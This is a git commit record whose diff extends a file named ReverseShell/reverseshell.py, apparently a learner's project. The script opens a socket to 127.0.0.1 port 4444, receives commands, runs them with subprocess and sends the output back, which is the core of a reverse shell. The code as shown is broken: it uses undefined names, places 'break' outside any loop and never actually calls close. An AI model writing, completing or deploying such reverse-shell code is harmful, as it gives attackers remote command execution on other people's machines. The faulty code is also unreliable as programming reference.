efa531c7b41dedf87a5084ad81086579b6f1ab6d
Pooja Nokhwal <poojanokhwal04@gmail.com>
2025-06-05 20:51:26 +0530

    Continued

--- ReverseShell/reverseshell.py
+++ ReverseShell/reverseshell.py
@@ -4,4 +4,11 @@ import subprocess
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("127.0.0.1", 4444))
 
-commds.recv(1024).decode()
+commands.recv(1024).decode()
+
+if command=="exit":
+    break
+
+result=subprocess.getoutput(command)
+s.send(result.encode())
+s.close
